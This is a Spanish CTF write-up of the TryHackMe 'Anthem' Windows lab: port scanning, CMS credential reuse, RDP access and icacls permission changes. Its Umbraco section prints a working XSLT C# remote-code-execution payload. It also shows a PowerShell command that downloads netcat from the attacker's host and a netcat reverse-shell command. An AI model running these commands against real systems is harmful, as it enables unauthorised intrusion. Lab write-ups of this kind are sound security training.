---
layout      : post
title       : "TryHackMe - Anthem"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_gif.gif
category    : [ thm ]
tags        : [ CMS, RDP, icacls ]
---
Máquina Windows nivel fácil. Jugaremos mucho a encontrar cosas en la web, caeremos en un Rabbit Hole con Umbraco (lindo, aprendimos bastante de esto) y accederemos remotamente a escritorios ajenos usando RDP.

![anthem_anthem](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_anthem.png)

### TL;DR (Spanish writeup)

El formato de tener que publicar el proceso, pero escondiendo la mayoría no me gusta nada. Pero toca hacerlo, ya que al parecer el tema "retirar" máquinas en `TryHackMe` no es un <<tema>> de conversación :P

Nos encontraremos con un servidor web alojando el CMS `Umbraco`, antes de abordarlo debemos recorrer las páginas e ir encontrando `flags` o `ítems`. Una vez encontradas, nos enfrentaremos a un lindo `Rabbit Hole` en la explotación del CMS `Umbraco`. Caeremos en cuenta que tenemos credenciales y un servicio para acceder remotamente a la máquina. Así encontraremos el flag `user.txt`.

Una vez dentro, enumeraremos y tendremos una carpeta oculta, la cual contiene un archivo al que no tenemos acceso. Validando los permisos del archivo vemos que somos el propietario, pero no tenemos acciones sobre él. Mediante `icacls` gestionaremos los permisos que tenemos hacia ese archivo y lograremos ver su contenido, tendremos una contraseña que nos servirá para entrar al escritorio remoto del usuario `Administrator`.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

### ¿Qué haremos?

El formato de `TryHackMe` es muy diferente al de `HackTheBox`, ya que algunas máquinas tienen preguntas que deben ser respondidas según vayamos avanzando con la explotación, así que respetaremos eso (también para probar :P).

* [Website Analysis](#website-analysis).
* [Spot the flags](#spot-flags).
* [Final Stage](#final-stage).

...

## Website Analysis [#](#website-analysis) {#website-analysis}

Realizaremos un escaneo de puertos para saber que servicios está corriendo la máquina.

```bash
❭ nmap -p- --open -v 10.10.87.37 -oG initScan
```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los 65535                                                                                  |
| --open     | Solo los puertos que están abiertos                                                                      |
| -v         | Permite ver en consola lo que va encontrando                                                             |
| -oG        | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard      |

```bash
❭ cat initScan 
# Nmap 7.80 scan initiated Thu Feb  4 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.87.37
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.87.37 ()    Status: Up
Host: 10.10.87.37 ()    Ports: **/open/tcp//http///, ****/open/tcp//ms-wbt-server///    Ignored State: filtered (65533)
# Nmap done at Thu Feb  4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 585.65 seconds
```

Perfecto, tenemos:

| Puerto | Descripción |
| ------ | :---------- |
| ** (Pero creo que se entiende cual es) | **[HTTP](https://es.wikipedia.org/wiki/Protocolo_de_transferencia_de_hipertexto)** |
| ****   | **[RPD](https://docs.microsoft.com/en-us/windows/win32/termserv/remote-desktop-protocol)** |

Hagamos nuestro escaneo de scripts y versiones en base a cada puerto, con ello obtenemos informacion mas detallada de cada servicio:

```bash
❭ nmap -p **,**** -sC -sV 10.10.87.37 -oN portScan
```

| Parámetro | Descripción |
| ----------|:----------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
❭ cat portScan 
# Nmap 7.80 scan initiated Thu Feb  4 25:25:25 2021 as: nmap -p **,**** -sC -sV -oN portScan 10.10.87.37
Nmap scan report for 10.10.87.37
Host is up (0.34s latency).

PORT     STATE SERVICE       VERSION
**/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-robots.txt: 4 disallowed entries 
|_/***/ /*****/ /umbraco/ /umbraco_client/
|_http-title: Anthem.com - Welcome to our blog
****/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-LU09299160F
|   NetBIOS_Domain_Name: WIN-LU09299160F
|   NetBIOS_Computer_Name: WIN-LU09299160F
|   DNS_Domain_Name: WIN-LU09299160F
|   DNS_Computer_Name: WIN-LU09299160F
|   Product_Version: 10.0.17763
|_  System_Time: 2021-02-04T22:17:08+00:00
| ssl-cert: Subject: commonName=WIN-LU09299160F
| Not valid before: 2021-01-02T15:57:43
|_Not valid after:  2021-07-04T15:57:43
|_ssl-date: 2021-02-04T22:17:23+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb  4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 31.22 seconds
```

Obtenemos:

| Puerto | Servicio | Versión |
| :----- | :------- | :-------|
| **     | HTTP     | Microsoft HTTPAPI httpd 2.0 |
| ****   | RDP      | Microsoft Terminal Services |

Empecemos a responder preguntas :P

...

#### What port is for the web server?

Bueno, como vimos anteriormente, esta sobre el puerto `**` (Igual por algún lado creo que se filtrara :P).

![anthem_page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80.png)

#### What port is for remote desktop service?

También lo vimos en el puerto `****`.

#### What is a possible password in one of the pages web crawlers check for?

Enumerando (y fijándonos en el escaneo anterior) con `robots.txt` tenemos lo que parece ser una contraseña: `****************`.

![anthem_page80_robotsTXT](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80_robotsTXT.png)

#### What CMS is the website using?

Apoyados en la imagen anterior (y también del escaneo) sabemos que está usando el CMS [Umbraco](https://es.wikipedia.org/wiki/Umbraco).

#### What is the domain of the website?

Por varios sitios (y en el escaneo :P :P) vemos el dominio `anthem.com`.

#### What's the name of the Administrator

Acá usando la ayuda que nos brinda, indica que debemos buscar :O, pero ni idea... Después de leer atentamente, los compañeros de trabajo le dedican un poema al admin:

![anthem_page80_poem](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80_poem.png)

Buscando en internet la frase, tenemos el nombre del autor, ese resulta ser el admin (:(

#### Can we find find the email address of the administrator?

Dado que vimos un correo, pero ese no es el indicado, podemos pensar que existe un patrón en los correos, teniendo el nombre podemos generar uno:

* Correo que encontramos pero no es: **JD@anthem.com**.
* Correo generado con el patron (iniciales del nombre): ****@anthem.com**.

...

## Spot Flags [#](#spot-flags) {#spot-flags}

```bash
Our beloved admin left some flags behind that 
we require to gather before we proceed to the next task..
```

Recorriendo la pagina, vemos algunas banderas en formato CTF, tales como `HTB{...}`, encontremoslas.

#### What is flag 1?

![anthem_page80_flag1](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80_flag1.png)

#### What is flag 2?

![anthem_page80_flag2](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80_flag2.png)

#### What is flag 3?

![anthem_page80_flag3](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80_flag3.png)

#### What is flag 4?

![anthem_page80_flag4](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80_flag4.png)

...

## Final Stage [#](#final-stage) {#final-stage}

```bash
Let's get into the box using the intel we gathered.
```

Si intentamos logearnos en el apartado de `/umbraco` con las credenciales que tenemos volando, logramos entrar:

![anthem_page80_umbraco](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80_umbraco.png)

![anthem_page80_umbraco_login](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80_umbraco_login.png)

...

* [Rabbit hole Umbraco](#umbraco-rabbit-hole).
* [Access with RDP](#access-with-rdp).

...

### ▿ Rabbit hole (`Umbraco exploitation`) {#umbraco-rabbit-hole}

> Que me gusto, aunque hubiera sido un rabbit hole :P

Recorriendo la página, podemos encontrar la versión del software, en este caso: `Umbraco versión 7.15.4`. Buscando exploits sobre esa versión encontramos uno con el que ya había estado jugando en una máquina de `HackTheBox`, concretamente en `Remote` (de la cual [tengo un writeup](https://lanzt.github.io/blog/htb/HackTheBox-Remote), el cual me sirvió para guiarme sobre como conseguir una reverse Shell).

(La mayoría de referencias las reutilizaré de ese writeup, solo pa decirlo :P)

* [Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution](https://www.exploit-db.com/exploits/46153).

Bien, descargándolo y viendo el código, debemos modificar algunas líneas, tales como:

* login: el usuario (email).
* password: pues la password :P
* host: donde está alojado el CMS `Umbraco` (IP de la máquina).

El proceso de explotación se da por la falta de sanitizacion de la variable `ctl00$body$xsltSelection` del archivo `/umbraco/developer/Xslt/xsltVisualize.aspx`. En el que podemos enviar nuestro payload sin ningún problema.

El payload que usa el exploit es este:

```py
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \\
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \\
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \\
{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\\
 proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd;\\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \\
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \\
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\\
 </xsl:template> </xsl:stylesheet> ';
```

Como prueba de concepto, abre una calculadora, pero nosotros no queremos eso, intentemos ejecutar el comando `whoami`:

(Algo importante es que al final debemos indicarle que nos muestre la respuesta del request)

```py
# Step 4 - Launch the attack
r4 = s.post(url_xslt,data=data,headers=headers);

print(r4.text)
```

Ahora si, el payload quedaria:

```py
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \\
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \\
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \\
{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\\
 proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = "whoami";\\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \\
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \\
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\\
 </xsl:template> </xsl:stylesheet> ';
```

* [How works **startInfo.FileName** and **startInfo.Arguments**](https://stackoverflow.com/questions/7160187/standardoutput-readtoend-hangs).

En la respuesta tenemos:

```bash
nada u.u
```

Básicamente buscando en internet, tenemos que debemos agregarlo algo a la cadena, el tema es que ejecuta `cmd.exe`, pero se queda con la consola abierta y nunca veremos el output.

En `Stack Overflow` alguien agrego que usar `/c` al inicio de la cadena le indica a la consola que debe cerrarse apenas ejecute el comando. Probémoslo:

* [How to pass mult args in **proc.StartInfo**](https://stackoverflow.com/questions/15061854/how-to-pass-multiple-arguments-in-processstartinfo#answer-15062027).

```bash
...
proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = "/c whoami";\
...
```

Ejecutamos:

![anthem_bash_pyRCE_whoami](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_pyRCE_whoami.png)

Perfecto, ahora que tenemos ejecución de comandos, probemos cositas y veamos como conseguir la shell...

Debemos subir el binario `nc` a la maquina, nos apoyaremos de `PowerShell` para hacerlo:

▸ Listamos el directorio `TEMP`:

```py
...
proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = @"/c dir ..\..\..\\Windows\\TEMP";\
...
```

![anthem_bash_pyRCE_dirTEMP](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_pyRCE_dirTEMP.png)

▸ Ponernos en escucha donde tenemos el binario `nc`:

```bash
❭ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

▸ Agregamos la linea que va a descargar el binario y lo guardara en la carpeta `TEMP` del sistema:

```py
...
proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = @"/c powershell IWR -uri http://10.2.65.117:8000/nc64.exe -OutFile c:\\Windows\\TEMP\\nc.exe";\
...
```

▸ Listamos el directorio `TEMP` para validar:

```py
...
proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = @"/c dir ..\..\..\\Windows\\TEMP";\
...
```

![anthem_bash_pyRCE_dirTEMP_nc](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_pyRCE_dirTEMP_nc.png)

Nice, no sé por qué solo se muestra nuestro binario, pero bueno, sabemos que esta, ahora ejecutémoslo:

▸ Nos ponemos en escucha:

```bash
❭ nc -lvp 4433
listening on [any] 4433 ...
```

▸ Le indicamos que nos genere la Reverse Shell:

```py
...
proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = @"/c ..\..\..\\Windows\\TEMP\\nc.exe 10.2.65.117 4433 -e cmd.exe";\
...
```

![anthem_bash_pyRCE_revshell](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_pyRCE_revshell.png)

Perfectooooooooooooooooooo, tamos dentro pai (:

Enumerando usuarios tenemos uno conocido:

```powershell
c:\>net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
**** (acá ta el user u.u)                       WDAGUtilityAccount
```

Después de un rato decidí probar con el puerto `RDP` pa ver si lográbamos entrar, ya que por este método no conseguí nada útil, simplemente un directorio oculto con un archivo al que no podemos acceder, pero de esto hablaremos un poco más adelante.

**Final del rabbit hole :P (al menos vimos como entrar a la máquina explotando `Umbraco`**

El tema es que en las preguntas, después de haber encontrado las flags, nos pedía la de `user.txt`, se me hizo raro en el momento (y también cuando hicimos `whoami` hubiera sido un indicio de que íbamos por otro camino), pero pues no le puse cuidado y pueeeeeeees la máquina no está hecha para entrar por este lado (o pues no logre moverme al usuario necesario desde dentro)...

### ▿ Acceso con RDP a la máquina {#access-with-rdp}

Entonces :( si recordamos, tenemos el puerto `****` (RDP) abierto. Este puerto nos permite conectarnos de manera remota a un computador. Intentémoslo :O

Encontramos esta herramienta: `remmina`.

* [How to connect to a remote desktop from Linux.](https://opensource.com/article/18/6/linux-remote-desktop)

Después de instalarla, la ejecutamos e ingresamos la IP de la máquina:

![anthem_bash_remminaIP](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_remminaIP.png)

Damos `enter`, aceptamos el certificado y a continuación nos pide las credenciales del usuario:

![anthem_bash_remminaLogin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_remminaLogin.png)

Estando dentro (supongo que no me cargo el fondo de pantalla :P):

![anthem_bash_remminaDesktop](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_remminaDesktop.png)

#### Gain initial access to the machine, what is the contents of user.txt?

![anthem_bash_remminaDesktop_user](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_remminaDesktop_user.png)

#### Can we spot the admin password?

Enumerando la máquina, encontramos un folder oculto en la raiz del sistema.

![anthem_bash_remminaDesktop_backupfolder](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_remminaDesktop_backupfolder.png)

Dentro tenemos un archivo, pero que al intentar abrilo, no nos deja por falta de permisos:

![anthem_bash_remminaDesktop_backup_restoreTXT](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_remminaDesktop_backup_restoreTXT.png)

Si revisamos el `owner` del archivo con el comando `dir /q`, vemos que somos nosotros, podemos usar `icacls` para validar que permisos tenemos sobre el archivo:

```powershell
c:\backup>icacls restore.txt
Successfully processed 1 files; Failed processing 0 files
```

Bien, pues siendo los propietarios del archivo podemos cambiarle los permisos, indiquémosle con `icacls` que le dé permisos de modificación sobre el archivo a nuestro usuario:

![anthem_bash_remminaDesktop_backup_restoreTXT_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_remminaDesktop_backup_restoreTXT_done.png)

* [Info sobre **ICACLS** y gestion de permisos](https://www.smythsys.es/11828/icacls-listar-los-permisos-de-directorios-en-windows-y-ver-a-que-carpetas-puede-acceder-un-usuario/).

Perfecto, tenemos una string que parece una contraseña :P

#### Escalate your privileges to root, what is the contents of root.txt?

Migramos al usuario `Administrator` y tenemos:

![anthem_bash_remminaDesktop_adminLogin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_remminaDesktop_adminLogin.png)

Y listos, podemos ver la flag de `root.txt`; hemos terminado (:

...

Máquina muy de jugar (CTF), me estoy enfocando en máquinas Windows, ya que intente una nivel difícil en `HackTheBox` y me exploto la cabeza, muy bajo nivel para meterle.

Me hubiera gustado que la ruta hubiera sido explotar `Umbraco`, de alguna forma encontrar la contraseña del usuario y ahí si hacer uso del puerto `RDP`... Pero bueno, no pasa nada, igual se aprendió :P

Me gusto el uso de `icacls` para gestionar permisos y entiendo que es superútil en entornos reales.

Muchas gracias por leer y como siempre... A seguir rompiendo todo (: